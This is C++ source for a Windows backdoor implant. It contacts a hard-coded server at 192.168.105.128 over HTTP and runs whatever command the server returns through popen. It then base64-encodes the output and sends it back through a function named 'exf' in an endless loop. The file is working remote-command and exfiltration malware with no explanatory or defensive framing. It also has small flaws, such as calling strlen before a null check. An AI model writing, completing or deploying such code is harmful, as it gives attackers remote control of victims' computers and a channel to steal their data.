#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <cstdio>
#include <memory>
#include <array>
#include <stdexcept>
#include <string>
#include <vector>
#include <bitset>
#include <cstring>
#include <cstdlib>


#pragma comment(lib, "wininet.lib")

std::string globalData;
char str_ [] = "hello";

// Function to initialize the Internet connection
HINTERNET InitializeInternet(const char* agent) {
    HINTERNET hInternet = InternetOpen(agent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "InternetOpen failed: " << GetLastError() << std::endl;
    }
    return hInternet;
}

// Function to connect to the server
HINTERNET ConnectToServer(HINTERNET hInternet, const char* serverAddress, int port) {
    HINTERNET hConnect = InternetConnect(hInternet, serverAddress, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        std::cerr << "InternetConnect failed: " << GetLastError() << std::endl;
    }
    return hConnect;
}

// Function to send a request and read the response
bool SendRequest(HINTERNET hConnect, const char* endpoint, const char* message) {
    HINTERNET hRequest = HttpOpenRequest(hConnect, "GET", endpoint, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        std::cerr << "HttpOpenRequest failed: " << GetLastError() << std::endl;
        return false;
    }

    // Send the request
    if (!HttpSendRequest(hRequest, NULL, 0, (LPVOID)message, strlen(message))) {
        std::cerr << "HttpSendRequest failed: " << GetLastError() << std::endl;
        InternetCloseHandle(hRequest);
        return false;
    }

    // Read the response
    char buffer[1024];
    DWORD bytesRead;
    while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        //std::cout << buffer;
        globalData.append(buffer, bytesRead);
    }

    InternetCloseHandle(hRequest);
    return true;
}
int exf(const char* str_){
    // Initialize Internet
    HINTERNET hInternet = InitializeInternet(str_);
    if (!hInternet) return 1;

    // Connect to the server
    HINTERNET hConnect = ConnectToServer(hInternet, "192.168.105.128", 80);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Send "hello" message to the server
    if (!SendRequest(hConnect, "/", str_)) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Clean up
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return 1;
}
char* executeCommand(const std::string& cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd.c_str(), "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }

    char* output_cstr = new char[result.size() + 1];
    std::copy(result.begin(), result.end(), output_cstr);
    output_cstr[result.size()] = '\0'; // Null-terminate the char array

    return output_cstr;
}

// Function to handle command execution and return output as a char array
char* runCommand(const std::string& command) {
    try {
        return executeCommand(command);
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << '\n';
        return nullptr;
    }
}
char* base64_encode(const char* in, size_t length) {
    static const char table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::vector<unsigned char> out;
    int val = 0, valb = -6;
    
    for (size_t i = 0; i < length; ++i) {
        val = (val << 8) + (unsigned char)in[i];
        valb += 8;
        while (valb >= 0) {
            out.push_back(table[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    
    if (valb > -6) out.push_back(table[((val << 8) >> (valb + 8)) & 0x3F]);
    
    while (out.size() % 4) out.push_back('=');
    
    // Allocate memory for the encoded result
    char* result = new char[out.size() + 1];
    std::memcpy(result, out.data(), out.size());
    result[out.size()] = '\0';  // Null-terminate the string
    
    return result;
}

int main() {


    exf(str_);
    
    while(true){
        char* output = runCommand(globalData.c_str());
        globalData = "";
        size_t length = std::strlen(output);

        if (output) {
            std::cout << "Command output:\n" << output << std::endl;
            char* encoded = base64_encode(output, length);
            exf(encoded);
            delete[] output; // Clean up
        }
    }
    
    std::cout << "\nPress Enter to close the application..." << std::endl;
    std::cin.get();

    return 0;
}
